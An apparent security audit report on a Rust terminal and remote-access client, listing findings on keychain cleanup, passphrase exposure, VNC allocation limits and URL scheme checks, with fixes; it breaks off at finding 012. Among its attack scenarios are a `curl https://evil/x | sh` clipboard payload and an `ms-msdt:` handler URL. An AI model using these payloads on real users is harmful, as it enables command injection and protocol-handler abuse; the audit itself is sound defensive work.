# Security Audit Report

**Project:** Nexus Terminal — Rust port (`rust/` workspace: `nexus-core` + `nexus` egui app)
**Branch / base commit:** `rust-port` @ `8766846`
**Date:** 2026-10-12 07:23 (local)
**Mode:** Fix mode (findings patched, tested and committed where safe; see §6 Status column)
**Scope restriction requested by the owner:** only the `rust/` folder was reviewed and modified. Files outside it (`.github/`, `release.sh`, `docs/`) were read for context and are reported on but not changed.

## 1. Executive Summary

Nexus Terminal is a native desktop client (egui/eframe) for SSH, Telnet, RAW TCP, Serial, VNC, IRC, GitHub and local shells, with an OS-keychain-first credential store backed by an Argon2id + AES-256-GCM vault, SQLite profile storage, SFTP, port forwarding, session recording and a check-only updater. There is no web frontend, no listening network service and no multi-user component: the attacker positions that matter are (a) hostile or compromised remote servers, (b) a hostile network on the path to them, (c) another user or process on the same machine, and (d) someone who obtains the data directory or a backup.

The core cryptography and transport posture is good. The vault and encrypted exports use Argon2id (128 MiB, t=3, p=4) with AES-256-GCM and CSPRNG salts/nonces; SSH uses russh 0.64 whose defaults exclude SHA-1 key exchange and MACs and prefer the hybrid post-quantum `mlkem768x25519-sha256`; IRC TLS uses rustls with webpki roots and hostname verification; HTTP uses ureq with rustls and never forwards `Authorization` across redirects; host keys are verified on every SSH hop including jump hosts and VNC/IRC tunnels; SQL is fully parameterised; SFTP download names and recording IDs are traversal-safe; there are no hardcoded secrets and no disabled TLS verification anywhere.

The highest-risk issues found and fixed in this run:

- **Deleting a profile left its credentials in the OS keychain** (only the vault was purged), so passwords, TOTP seeds and tokens outlived the profile the user believed had been removed. Fixed in `9cf2217`.
- **SSH key passphrases were passed to `ssh-keygen` as a command-line argument**, visible to every local user via `ps`/`/proc/*/cmdline`. Key generation is now done in-process with the `ssh-key` crate (encrypted OpenSSH format, mode 0600). Fixed in `0a18f7e`.
- **The loopback bridge used for IRC/VNC-over-SSH accepted whichever local connection arrived first**, a classic ephemeral-port race that would let another local process be spliced into the tunnel. The accepted peer is now checked against our own socket. Fixed in `0a18f7e`.
- **A hostile VNC server could force multi-gigabyte allocations** (65535×65535 desktop, 4 GiB ZRLE rectangle) and crash the client. Sizes and lengths are now bounded. Fixed in `aac986d`.
- **URLs supplied by the update server or the GitHub API were handed to the OS opener with any scheme** (`file:`, `ssh:`, custom handlers). Only `http(s)` links are opened now. Fixed in `aac986d`.
- The vault file was rewritten in place (crash could truncate it, and a pre-existing 0644 file kept its mode); Argon2-derived keys were not wiped; recordings (which capture typed passwords) and JSON secret exports were created with the default umask. All fixed in `9cf2217`.

Remaining open items are Low/Medium defence-in-depth: remote OSC 52 / VNC clipboard writes, plaintext secrets inside login-script steps and proxy settings (and their absence from JSON-export redaction), the `rsa` Marvin advisory with no upstream fix, an unconditional update check at launch that the module docs describe as opt-in, unbounded IRC state growth driven by a hostile server, and supply-chain hygiene in CI (tag-pinned actions, unsigned releases) which lives outside `rust/`.

## 2. Scope Reviewed

| Area | Files |
|---|---|
| Core crate | `rust/core/src/{lib,config,secrets,storage,models,validation,exportimport,keyfiles,sshconfig,terminalenv,recording,updater,service,sessions,ircformat}.rs`, `rust/core/src/clients/{mod,ssh,sftp,local,telnet,raw,serial,github,irc,vnc}.rs`, `rust/core/migrations/*.sql` |
| App crate | `rust/app/src/{main,app,state,chrome,tabs,sidebar,terminal,profile_editor,quick_connect,settings,ssh_keys,sftp,transfer,forwards,triggers,recordings,github_view,irc_view,vnc_view,raw_view,widgets}.rs` (views/theme/splits/snippets skimmed for sinks only) |
| Tests | `rust/core/tests/{sessions,ssh_integration}.rs`, fixtures README, all `#[cfg(test)]` modules |
| Build / deps | `rust/Cargo.toml`, `rust/core/Cargo.toml`, `rust/app/Cargo.toml`, `rust/Cargo.lock` (598 crates), `rust/rust-toolchain.toml`, `rust/app/build.rs` |
| Packaging / release | `rust/release.sh`, `rust/packaging/{linux,macos,windows}/*`, root `release.sh` (context) |
| CI (context only, not modified) | `.github/workflows/ci.yml`, `.github/workflows/release-builds.yml` |
| Third-party defaults verified in source | `russh 0.64.1` (`negotiation.rs` DEFAULT preferred lists), `ssh-key 0.7.0-rc.11` (features, `write_openssh_file` mode), `ureq 3.4.2` (`RedirectAuthHeaders::Never` default), `rand_core 0.10` |

Not in scope: live testing against third-party hosts, reverse engineering built binaries, the removed Go/Wails code, and the LaTeX user guide.

## 3. Methodology

- **Static review** of every source file listed above, tracing each untrusted input (remote bytes, files, CLI flags, clipboard, profile JSON, update manifest) to its sinks (memory allocation, filesystem, process spawn, OS opener, clipboard, terminal parser).
- **Dependency review**: `cargo audit` 0.22.2 against the RustSec DB (1296 advisories) on `Cargo.lock`; inspection of the locked versions of the crates that implement security controls.
- **Configuration review** of the workspace manifests, toolchain pin, release script, packaging scripts and (read-only) CI workflows.
- **Threat modelling / adversarial mapping** from four starting positions: hostile server, on-path network attacker, co-resident local user/process, and holder of a stolen data directory or backup.
- **Cryptography review** of the vault, encrypted export, TOTP, VNC auth, SSH algorithm negotiation, TLS stacks and randomness sources.
- **Secrets lifecycle review** from entry (prompt/editor/CLI) through storage (keychain/vault/DB/recordings/exports), process boundaries (`ssh-keygen` argv, environment) to destruction (drop/zeroize/delete).
- **Memory-safety review** of `unsafe` usage (test-only `libc::openpty`) and of every length-prefixed parser (Telnet IAC, VNC RFB, ZRLE/Tight/Hextile, IRC lines, asciicast, SOCKS5/HTTP CONNECT, SSH config, update manifest).
- **DoS analysis** of every allocation and loop driven by remote data.
- **Frontend review**: the UI is native egui, so the HTML/JS checklist does not apply; UI event flow, worker-thread error surfacing and untrusted-text rendering were reviewed instead.
- **Test review and dynamic checks**: `cargo test --workspace` (136 tests at baseline, 142 after fixes), `cargo fmt --check`, `cargo clippy --all-targets -D warnings`; the OpenSSH-backed integration tests ran against a throwaway `sshd`.

## 4. Risk Rating Method

Severity combines exploitability (attacker position and effort), the security property affected, and impact:

- **Critical** — remote compromise or credential disclosure with no preconditions.
- **High** — credential/session compromise or MITM on a primary path with realistic preconditions.
- **Medium** — needs a hostile server, a local foothold, or user interaction; or a reliable remote crash.
- **Low** — defence-in-depth, hardening, local-only or user-assisted exposure.
- **Informational** — verified clean area or design note.

Confidence reflects how directly the code demonstrates the issue: **High** = read in the code and/or reproduced by a test; **Medium** = clear in the code but depends on environment or an unverified assumption; **Low** = plausible but unconfirmed.

## 5. Attack Surface Map

**Entry points (untrusted bytes)**

| Source | Parser / sink | Notes |
|---|---|---|
| SSH server | russh (kex, auth, channels), `alacritty_terminal` VT parser, SFTP listings, `run_command` output, forwarded-tcpip/agent channel requests | host key verified per hop; agent channels only when forwarding enabled; remote-forward channels only for registered targets |
| Telnet / RAW / Serial | `telnet.rs` IAC state machine, `raw.rs` history, VT parser | bounded pending buffer (8 KiB), history caps (10k entries / 10 MiB) |
| VNC server | `vnc.rs` RFB 3.3/3.7/3.8, Raw/CopyRect/Hextile/ZRLE/Tight(+JPEG via `image`) | sizes now bounded (fixed); clipboard pushed to local clipboard |
| IRC server | `irc.rs` line parser, `ircformat.rs` mIRC codes + escape stripping | 1 MiB line cap, 2000-entry LIST cap; channel/user maps unbounded |
| GitHub API | `github.rs` JSON (4 MiB cap), zipball (2 GiB cap) | base URL validated HTTPS for saved profiles |
| Update server | `updater.rs` JSON/plain (1 MiB cap) | check-only; `releaseURL` opened (now http(s) only) |
| Local files | `.nexus`/`.link` imports (10 MiB), JSON imports (5 MiB), `~/.ssh/config` (5 MiB, 5000 blocks), private keys (1 MiB), recordings (100 MiB playback), dropped files | all size-capped |
| CLI | `--connect/--open/--do/--answer/--data-dir/--run-local` | `--answer` carries secrets in argv (test aid) |
| Clipboard / IME | terminal paste, VNC paste | bracketed paste strips ESC |

**Trust boundaries**: UI thread ↔ worker threads (mpsc events, `POSTED` error queue); app ↔ OS keychain (D-Bus/Keychain/CredMan via `keyring`); app ↔ `~/.ssh` and data directory; app ↔ child shell (PTY, inherits full environment); app ↔ system browser (`open_url`).

**Data stores**: `nexus.db` (profiles incl. inline `proxyPassword`, `totpSecret`, login scripts; known hosts; audit log; snippets; prefs), `vault/vault.json` (AES-GCM blobs), OS keychain items `NexusTerminal/profile:<id>:<kind>` (+ legacy `AlchementaryLink`), `recordings/*.cast` (full I/O including typed input), `triggers.json`, `sftp-bookmarks.json`, egui `persistence` state.

**Roles**: single local user; no server-side authorisation model exists.

**Attacker starting positions**: (A) hostile/compromised remote server; (B) network MITM; (C) another local user or process; (D) possession of the data directory/backup/laptop; (E) compromised dependency or CI.

## 6. Findings Summary Table

| ID | Severity | Confidence | Title | Component | Status |
|---|---|---|---|---|---|
| SEC-20261012-001 | Medium | High | Profile deletion left credentials in the OS keychain | `core/src/secrets.rs` `Secrets::delete_profile` | Fixed in `9cf2217` |
| SEC-20261012-002 | Medium | High | SSH key passphrase passed to `ssh-keygen` on the command line | `core/src/service.rs` `generate_ssh_key` | Fixed in `0a18f7e` |
| SEC-20261012-003 | Medium | Medium | Loopback tunnel bridge accepted any local connection (port race) | `core/src/clients/ssh.rs` `open_tunnel` | Fixed in `0a18f7e` |
| SEC-20261012-004 | Medium | High | VNC server could force multi-GiB allocations (desktop size, ZRLE length) | `core/src/clients/vnc.rs` | Fixed in `aac986d` |
| SEC-20261012-005 | Medium | High | Network-supplied URLs opened with any scheme | `app/src/settings.rs`, `app/src/github_view.rs` | Fixed in `aac986d` |
| SEC-20261012-006 | Low | High | Vault/export rewritten in place; existing file mode kept | `core/src/secrets.rs` `write_private` | Fixed in `9cf2217` |
| SEC-20261012-007 | Low | High | Derived keys and secret strings not wiped from memory | `core/src/secrets.rs`, `exportimport.rs`, `sessions.rs` | Partially fixed in `9cf2217` (keys zeroized; strings open) |
| SEC-20261012-008 | Low | High | Recordings and JSON secret exports created with default umask | `core/src/recording.rs`, `app/src/transfer.rs`, `app/src/main.rs` | Fixed in `9cf2217` |
| SEC-20261012-009 | Low | High | Unbounded `run_command` output, growing forward task list, SOCKS5 length truncation | `core/src/clients/ssh.rs` | Fixed in `0a18f7e` |
| SEC-20261012-010 | Medium | High | Remote hosts can overwrite the local clipboard (OSC 52, VNC ServerCutText) | `app/src/terminal.rs`, `app/src/app.rs` | Open |
| SEC-20261012-011 | Low | High | Plaintext secrets inside profile records (login scripts, proxy password, inline TOTP) and JSON export redaction gap | `core/src/models.rs`, `core/src/service.rs` `export_json` | Open |
| SEC-20261012-012 | Low | High | RUSTSEC-2023-0071: `rsa` Marvin timing side channel (via russh) | `Cargo.lock` `rsa 0.10.0-rc.18` | Open (no upstream fix) |
| SEC-20261012-013 | Low | High | Update check runs on every launch although documented as opt-in | `app/src/app.rs` `App::new`, `core/src/updater.rs` | Open |
| SEC-20261012-014 | Low | Medium | Hostile IRC server can grow channel/user/target state without bound | `core/src/clients/irc.rs`, `app/src/irc_view.rs` | Open |
| SEC-20261012-015 | Low | Medium | Saved credentials written before authentication succeeds; store failure silent | `core/src/sessions.rs` `secret_fn` | Open |
| SEC-20261012-016 | Low | Medium | Empty vault accepts any master password (split-key vault on typo) | `core/src/secrets.rs` `Vault::unlock` | Open |
| SEC-20261012-017 | Low | High | Multi-line paste sent without confirmation (paste-jacking) | `app/src/terminal.rs` `paste` | Open |
| SEC-20261012-018 | Low | High | `--answer` passes secrets as process arguments | `app/src/main.rs` | Open (test aid; documented) |
| SEC-20261012-019 | Low | Medium | Supply chain: tag-pinned actions, no explicit CI token permissions, unsigned releases | `.github/workflows/*.yml`, `rust/packaging/macos/build-app.sh` | Open (outside `rust/`) |
| SEC-20261012-020 | Low | Medium | Recording listing reads every `.cast` file fully (up to 250 MiB each) | `core/src/recording.rs` `read_meta` | Open |
| SEC-20261012-021 | Informational | High | Insecure-by-choice modes: host-key policy `insecure`, direct VNC, Telnet | profile options | Accepted, documented |
| SEC-20261012-022 | Informational | High | Verified-absent classes (SQLi, path traversal, TLS bypass, hardcoded secrets, unsafe, SHA-1 SSH algorithms, redirect token leak) | whole workspace | Clean |

## 7. Detailed Findings

### Finding ID: SEC-20261012-001

#### Title
Profile deletion left credentials in the OS keychain

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/secrets.rs` — `Secrets::delete_profile` (pre-fix line 254); `rust/core/src/service.rs` — `Service::delete_profile`; `rust/app/src/chrome.rs` — `Dialog::Delete` (“will be deleted, with its saved credentials”).

#### Description
`Secrets::set` stores a credential in the OS keychain whenever the keychain is available, under `profile:<id>:<kind>`. `delete_profile` only called `vault.delete_prefix`, so every keychain item (password, key passphrase, TOTP seed, GitHub token, VNC/IRC passwords, tunnel secrets) survived the profile's deletion, contrary to what the confirmation dialog tells the user.

#### Evidence
```rust
pub fn delete_profile(&self, profile_id: &str) {
    let _ = self.vault.delete_prefix(&format!("profile:{profile_id}:"));
}
```
`Secrets::set_checked` writes to `self.keychain` first when `keychain_ok`.

#### Attack Scenario
Position D: a user deletes a profile for a decommissioned host believing its TOTP seed and password are gone; the items remain in the keychain. Anyone who later gains access to the unlocked session (or a keychain export/backup) recovers them. On Linux Secret Service, any process running as the user can read the items.

#### Impact
Credential retention after an explicit delete; silent growth of orphaned secrets.

#### Recommendation
Delete every known kind from the keychain as well as the vault (done). Longer term, enumerate stored kinds instead of a static list.

#### Safer Example
```rust
pub const PROFILE_SECRET_KINDS: [&str; 11] = ["password", "passphrase", "totp", ...];
if self.keychain_ok { for kind in PROFILE_SECRET_KINDS { self.keychain.delete(&format!("profile:{profile_id}:{kind}")); } }
let _ = self.vault.delete_prefix(&format!("profile:{profile_id}:"));
```

#### Suggested Tests
`secrets::tests::deleting_a_profile_clears_every_vault_kind` (added). A keychain-backed test needs a CI secret-service; run manually on each OS.

#### References
CWE-459 (Incomplete Cleanup), CWE-212; OWASP ASVS 8.3.6.

#### Assumptions / Limitations
The static kind list must be kept in sync with the kinds the session manager and profile editor use.

---

### Finding ID: SEC-20261012-002

#### Title
SSH key passphrase passed to `ssh-keygen` on the command line

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/service.rs` — `Service::generate_ssh_key` (pre-fix lines 313-339); `rust/app/src/ssh_keys.rs`.

#### Description
The key manager spawned `ssh-keygen ... -N <passphrase>`. Command-line arguments are world-readable on Linux (`/proc/<pid>/cmdline`), visible in `ps` on all Unix systems and in Process Explorer/WMI on Windows for the lifetime of the (RSA 4096: seconds-long) process.

#### Evidence
```rust
cmd.args(["-q", "-t", &kind, "-f"]).arg(&path).args(["-C", &format!("{name}@nexus-terminal"), "-N", passphrase]);
```

#### Attack Scenario
Position C: any local user polling `ps -ef` (or a low-privilege malware process) captures the passphrase while the key is generated, then copies the key file later (it is 0600, but the same user's malware can read it).

#### Impact
Disclosure of a new key's passphrase to co-resident users/processes.

#### Recommendation
Generate keys in-process (done): `ssh-key` with the `encryption` feature is already compiled in through russh, producing OpenSSH-format files at mode 0600 with the passphrase never leaving process memory.

#### Safer Example
```rust
let key = russh::keys::PrivateKey::new(KeypairData::from(Ed25519Keypair::random(&mut rng)), comment)?;
let key = if passphrase.is_empty() { key } else { key.encrypt(&mut rng, passphrase.as_bytes())? };
key.write_openssh_file(&path, LineEnding::LF)?;
```

#### Suggested Tests
`ssh::tests::generates_encrypted_key_pairs_in_process` (added): encrypted key unreadable without the passphrase, readable with it, mode 0600, no overwrite, bad names/sizes rejected.

#### References
CWE-214 (Invocation of Process Using Visible Sensitive Information), CWE-526; ASVS 8.3.4.

#### Assumptions / Limitations
RSA generation is now done by the `rsa` crate (slower in debug builds; the UI already runs it on a worker thread). ECDSA is fixed to P-256, matching `ssh-keygen -t ecdsa`'s default.

---

### Finding ID: SEC-20261012-003

#### Title
Loopback tunnel bridge accepted any local connection (ephemeral-port race)

#### Severity
Medium

#### Confidence
Medium

#### Affected Files / Components
`rust/core/src/clients/ssh.rs` — `SshClient::open_tunnel` (pre-fix lines 443-461), used by IRC-over-SSH and VNC-over-SSH in `sessions.rs`.

#### Description
To give blocking IRC/VNC clients a `TcpStream` over a `direct-tcpip` channel, the code bound `127.0.0.1:0`, connected to it, then `accept()`ed and bridged the first accepted socket to the SSH channel. A local process that connects to the just-bound port before our own connect wins the accept and is spliced into the authenticated tunnel; our client's connection stays queued and the session hangs.

#### Evidence
```rust
let client = std::net::TcpStream::connect(addr)?;
let (server, _) = listener.accept()?;   // peer never checked
```

#### Attack Scenario
Position C: malware or another user scans for new loopback listeners (`/proc/net/tcp`) and connects immediately; it now talks to the remote IRC/VNC service through the victim's SSH session and credentials, and the victim's tab hangs on "Connecting".

#### Impact
Confused-deputy access to the tunnelled service; denial of service for the user.

#### Recommendation
Compare the accepted peer address with our connecting socket's local address and discard strangers (done). The best long-term fix is an in-process `Read + Write` adapter over the channel with no loopback socket at all.

#### Safer Example
```rust
let ours = client.local_addr()?;
loop { let (server, peer) = listener.accept()?; if peer == ours { return Ok((client, server)); } }
```

#### Suggested Tests
`ssh::tests::loopback_pair_ignores_a_stranger_that_connects_first` (added).

#### References
CWE-362 (Race Condition), CWE-441 (Unintended Proxy); ASVS 1.14.

#### Assumptions / Limitations
Winning the race requires sub-millisecond timing; it is a hardening fix. Loopback traffic is still unauthenticated for the lifetime of the bridge, which is one connection.

---

### Finding ID: SEC-20261012-004

#### Title
VNC server could force multi-GiB allocations (desktop size, ZRLE length)

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/core/src/clients/vnc.rs` — `Framebuffer::new`, `Client::run`, `read_update` (DesktopSize/ExtendedDesktopSize and encoding 16).

#### Description
`Framebuffer::new(w, h)` allocated `w*h*4` bytes straight from the server-supplied ServerInit or DesktopSize pseudo-rectangle (up to 65535² × 4 ≈ 16 GiB), and ZRLE rectangles read a `u32` length then called `read_n(len)` which allocates `len` bytes (up to 4 GiB) before any data arrives. Both are reachable after the (optional) VNC password handshake, i.e. by the server you connect to or anyone who can MITM a direct (unencrypted) VNC connection.

#### Evidence
```rust
let (w, h) = self.handshake(&mut r)?;
let mut local = Framebuffer::new(w, h);            // unbounded
...
16 => { let len = read_u32(r)? as usize; let data = read_n(r, len)?; // vec![0u8; len]
```

#### Attack Scenario
Position A/B: a malicious VNC server (or a MITM on a direct VNC session, which the app warns about but allows) sends a 65535×65535 ServerInit → allocation failure aborts the whole application, closing every other session.

#### Impact
Reliable remote crash of the client (loss of all open sessions); memory exhaustion on the host.

#### Recommendation
Bound the desktop to 64 Mpx (256 MiB RGBA, above 8K) and any single compressed rectangle to 64 MiB (done); consider streaming ZRLE decompression instead of buffering.

#### Safer Example
```rust
fn new_checked(w: u16, h: u16) -> Result<Framebuffer> {
    if w == 0 || h == 0 || w as usize * h as usize > MAX_FB_PIXELS { return Err(...) }
```

#### Suggested Tests
`vnc::tests::server_sizes_and_rect_lengths_are_bounded` (added). Next step: a `cargo-fuzz` target over `read_update`.

#### References
CWE-770 (Allocation of Resources Without Limits), CWE-789; OWASP ASVS 12.1.

#### Assumptions / Limitations
Raw-encoded rectangles can still be up to the (now bounded) framebuffer size; Tight lengths were already limited to 4 MiB by the compact-length encoding.

---

### Finding ID: SEC-20261012-005

#### Title
Network-supplied URLs opened with any scheme

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/app/src/settings.rs` (“View release” → `info.release_url`), `rust/app/src/github_view.rs` (Visit / double-click → `html_url`). `rust/app/src/terminal.rs` was already restricted by `URL_RE` to `http(s)/ftp`.

#### Description
`egui::Context::open_url` hands the string to the platform opener (`xdg-open`, `ShellExecute`, `open`). The release URL comes from the update manifest and repository URLs from the GitHub API; neither was checked for scheme, so `file:`, `ssh:`, `vnc:`, `ms-msdt:` or any registered custom handler could be launched with one click.

#### Evidence
```rust
ui.ctx().open_url(egui::OpenUrl::new_tab(&info.release_url));
Some(Action::Visit(url)) if !url.is_empty() => ui.ctx().open_url(egui::OpenUrl::new_tab(url)),
```

#### Attack Scenario
Position B/E: compromise of `dixon.cx` (or a GitHub Enterprise base URL the user configured) returns `"releaseURL": "ms-msdt:/id PCWDiagnostic ..."` or `file:///...`; the user clicks “View release”.

#### Impact
Protocol-handler abuse on the user's machine; phishing via arbitrary targets.

#### Recommendation
Only open `http://`/`https://` links from network data (done via `widgets::open_web_url`). Consider showing the host before opening.

#### Safer Example
```rust
pub fn is_web_url(url: &str) -> bool { let u = url.trim(); u[..8].eq_ignore_ascii_case("https://") || u[..7].eq_ignore_ascii_case("http://") }
```

#### Suggested Tests
`widgets::tests::only_web_urls_are_opened` (added).

#### References
CWE-939 (Improper Authorization in Handler for Custom URL Scheme), CWE-601; ASVS 5.1.5.

#### Assumptions / Limitations
A compromised update server can still send an `https://` phishing link; release signing (see §13) is the real control.

---

### Finding ID: SEC-20261012-006

#### Title
Vault and exports rewritten in place; existing file mode kept

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/core/src/secrets.rs` — `write_private`, used by `Vault::save` and `exportimport::encrypt_and_export`.

#### Description
`OpenOptions::truncate(true)` on the live `vault.json` meant a crash or power loss between truncate and `sync_all` left an empty or partial vault (all saved credentials lost). The `mode(0o600)` only applies when a file is created, so a vault that already existed with wider permissions (e.g. copied from a backup with 0644) kept them forever.

#### Evidence
```rust
opts.write(true).create(true).truncate(true); ... let mut f = opts.open(path)?; f.write_all(data)?;
```

#### Attack Scenario
Position D: a backup restored as 0644 stays world-readable (ciphertext only, but with the salt → offline Argon2 attack). Robustness: any crash during `set`/`delete` corrupts the vault.

#### Impact
Loss of all saved credentials; weaker at-rest protection than intended.

#### Recommendation
Write to a sibling temp file with 0600, `sync_all`, then `rename` over the target (done). Clean up the temp file on failure.

#### Safer Example
See `write_private` in `9cf2217`.

#### Suggested Tests
`secrets::tests::private_writes_are_atomic_and_owner_only` (added).

#### References
CWE-732, CWE-667 (improper locking / partial write); ASVS 8.1.

#### Assumptions / Limitations
`rename` replaces atomically on POSIX and on Windows via `MoveFileEx(MOVEFILE_REPLACE_EXISTING)`; the directory entry itself is not fsynced.

---

### Finding ID: SEC-20261012-007

#### Title
Derived keys and secret strings not wiped from memory

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/core/src/secrets.rs` (`derive_key`, `Unlocked`), `rust/core/src/exportimport.rs`, `rust/core/src/sessions.rs` (`secret_fn` cache, prompt replies), `rust/core/src/clients/ssh.rs` (`load_private_key` reads the key file into a `String`, passphrase `String`), `rust/app/src/chrome.rs` (prompt `value`), `rust/app/src/settings.rs` (master password).

#### Description
`derive_key` returned `[u8; 32]` by value (copies on the stack, never wiped); `Unlocked::drop` used plain `fill(0)` which the optimiser may elide; the export key was never wiped. Every password, passphrase, token and TOTP seed is a `String` that is dropped without zeroing, and `SecretMode::SessionOnly` keeps a plaintext copy for the session.

#### Evidence
```rust
pub fn derive_key(..) -> Result<[u8; 32]>   // pre-fix
impl Drop for Unlocked { fn drop(&mut self) { self.key.fill(0); } }
```

#### Attack Scenario
Position C/D with a memory-disclosure primitive (core dump, swap, debugger on an unlocked machine): secrets persist in freed heap until overwritten.

#### Impact
Defence-in-depth only; needs local code execution or a dump.

#### Recommendation
Done: keys are `zeroize::Zeroizing<[u8; 32]>`. Open: wrap secret `String`s in `Zeroizing<String>` / `secrecy::SecretString`, wipe prompt buffers after `send`, and consider `mlock` for the vault key on Unix. Set `prctl(PR_SET_DUMPABLE, 0)` while the vault is unlocked (Linux).

#### Safer Example
```rust
let pw: Zeroizing<String> = Zeroizing::new(std::mem::take(value));
```

#### Suggested Tests
Compile-time: types enforce it. Runtime: none practical.

#### References
CWE-316 (Cleartext Storage in Memory), CWE-244; ASVS 8.3.6.

#### Assumptions / Limitations
`egui::TextEdit` keeps its own copies of typed text in the UI memory; complete wiping is best-effort in a GUI toolkit.

---

### Finding ID: SEC-20261012-008

#### Title
Recordings and JSON secret exports created with the default umask

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/core/src/recording.rs` `Recorder::with_limit` (`File::create`), `rust/app/src/transfer.rs` `ExportJson` (`std::fs::write`), `rust/app/src/main.rs` `--data-dir` (`create_dir_all`).

#### Description
Session recordings store every byte the user types (`write_input`), including passwords entered at `sudo`/`su`/`passwd` prompts, as plain text. They were created 0644 (default umask) inside the 0700 recordings directory; a JSON export “with secrets” was written 0644 wherever the user chose; `--data-dir` directories were created 0755 unlike the normal data directory (0700).

#### Evidence
```rust
let mut f = File::create(&path)...        // recording.rs
std::fs::write(&path, j)                   // transfer.rs
std::fs::create_dir_all(&c.vault_dir)      // main.rs
```

#### Attack Scenario
Position C: the user exports JSON including proxy passwords/TOTP seeds to a shared directory; it is readable by other users. Recordings moved out of the data directory keep 0644.

#### Impact
Disclosure of typed secrets or exported secrets to other local users.

#### Recommendation
Create these files with mode 0600 and the directories with 0700 (done). Document that recordings contain typed input.

#### Safer Example
`nexus_core::secrets::write_private(&path, j.as_bytes())`.

#### Suggested Tests
`recording::tests::write_and_close` now asserts mode 0600.

#### References
CWE-276 (Incorrect Default Permissions), CWE-532; ASVS 8.3.

#### Assumptions / Limitations
Windows ACLs are inherited from the parent folder; no explicit ACL hardening is attempted.

---

### Finding ID: SEC-20261012-009

#### Title
Unbounded `run_command` output, growing forward task list, SOCKS5 length truncation

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/core/src/clients/ssh.rs` — `run_command` (used for `pwd` at SFTP open), local `start_forward` accept loop, `socks5`.

#### Description
(1) `run_command` accumulated channel data until EOF with no cap, so a hostile server could stream unlimited bytes in response to `pwd`. (2) Each accepted local-forward connection pushed an `AbortHandle` into a `Vec` that was only drained on stop; a long-lived forward with many connections grew without bound. (3) SOCKS5 encoded `host.len() as u8` and `username/password.len() as u8`, so values over 255 bytes produced a malformed request (silent truncation of the length byte).

#### Evidence
```rust
ChannelMsg::Data { data } => out.extend_from_slice(&data),      // no cap
t2.lock().unwrap().push(conn.abort_handle());                   // never pruned
let mut req = vec![5, 1, 0, 3, host.len() as u8];                // truncates
```

#### Attack Scenario
Position A: server answers `pwd` with gigabytes. Position C: anyone able to reach the local forward's bind address opens thousands of connections.

#### Impact
Memory exhaustion / slow leak; proxy misbehaviour.

#### Recommendation
Cap at 1 MiB, prune finished handles, reject over-long SOCKS5 fields (done).

#### Suggested Tests
`ssh::tests::socks5_requests_reject_overlong_fields` (added).

#### References
CWE-400, CWE-401, CWE-197 (Numeric Truncation).

---

### Finding ID: SEC-20261012-010

#### Title
Remote hosts can overwrite the local clipboard (OSC 52, VNC ServerCutText)

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`rust/app/src/terminal.rs` lines 22 and 295 (`TermEvent::ClipboardStore(_, s) => ui.ctx().copy_text(s)`); `rust/app/src/app.rs` line 507 (`Event::VncClipboard { text, .. } => self.s.ctx.copy_text(text)`).

#### Description
Any byte stream rendered in a terminal (an SSH/Telnet/serial host, a `cat` of a hostile file, a log line) can emit `ESC ] 52 ; c ; <base64> BEL` and the app silently replaces the user's clipboard. The VNC client likewise applies every `ServerCutText` from the server. Alacritty enables OSC 52 writes by default too, but tmux, iTerm2 and others require opt-in because of the paste-jacking risk. OSC 52 *reads* are not supported (clipboard contents cannot be exfiltrated), which is correct.

#### Evidence
```rust
if matches!(e, TermEvent::PtyWrite(_) | TermEvent::Title(_) | TermEvent::Bell | TermEvent::ClipboardStore(..)) { ... }
TermEvent::ClipboardStore(_, s) => ui.ctx().copy_text(s),
```

#### Attack Scenario
Position A: a compromised server prints an OSC 52 sequence containing `curl https://evil/x | sh\n`; the user later pastes into another terminal or shell believing the clipboard holds the command they copied moments earlier (the sequence can be emitted exactly when they select text).

#### Impact
Command injection into whatever the user pastes into next; social-engineering vector.

#### Recommendation
Add a preference (default off) for remote clipboard writes, or at minimum show a toast (“Remote set clipboard: …”) with the first line so the replacement is visible; same for VNC. Keep OSC 52 reads disabled.

#### Safer Example
```rust
TermEvent::ClipboardStore(_, s) if prefs.allow_remote_clipboard => { s.info(format!("Clipboard set by remote: {}", first_line(&s))); ctx.copy_text(s) }
```

#### Suggested Tests
Feed `\x1b]52;c;<b64>\x07` into `TermView` and assert `copy_text` is not called unless the preference is set.

#### References
CWE-451 (UI Misrepresentation), CWE-20; cf. CVE-2021-45698-style terminal clipboard findings.

#### Assumptions / Limitations
Left open because it is a deliberate compatibility feature (vim/tmux yank over SSH) and the right fix is a user-visible preference, which is a product decision.

---

### Finding ID: SEC-20261012-011

#### Title
Plaintext secrets inside profile records and JSON export redaction gap

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/core/src/models.rs` (`SshConfig::{totp_secret, proxy_password, login_scripts}`), `rust/core/src/storage.rs` (`ssh_config` JSON column), `rust/core/src/service.rs` `export_json`, `rust/app/src/profile_editor.rs` (Proxy section writes `c.proxy_password` directly; help text shows a login script sending `mysecretpassword`).

#### Description
The Go-compatible profile model carries `proxyPassword` and `totpSecret` inline and the login-script `send` steps are the documented way to automate password entry. These live in `nexus.db` in clear and are included in encrypted exports. `export_json(include_secrets=false)` clears only `proxy_password` and `totp_secret`; login-script values are exported verbatim.

#### Evidence
```rust
s.proxy_password.clear(); s.totp_secret.clear();   // login_scripts untouched
```

#### Attack Scenario
Position D: `nexus.db` from a backup yields proxy passwords and scripted login passwords without touching the keychain/vault. A user sharing a “no secrets” JSON export leaks login-script passwords.

#### Impact
Credential disclosure at rest and via export.

#### Recommendation
Move proxy password to the secret store (`profile:<id>:proxy-password`), warn in the editor when a `send` step looks like a password (`wait` step mentions “password”), redact `send` steps following a password prompt in non-secret exports, and consider SQLite `PRAGMA secure_delete`.

#### Suggested Tests
`export_json(false)` must not contain the value of a `send` step after a `wait "Password:"` step.

#### References
CWE-312 (Cleartext Storage of Sensitive Information), CWE-200; ASVS 8.3.4.

#### Assumptions / Limitations
Changing where `proxyPassword` lives affects `.link`/`.nexus` compatibility with the Go app; needs a migration decision from the owner.

---

### Finding ID: SEC-20261012-012

#### Title
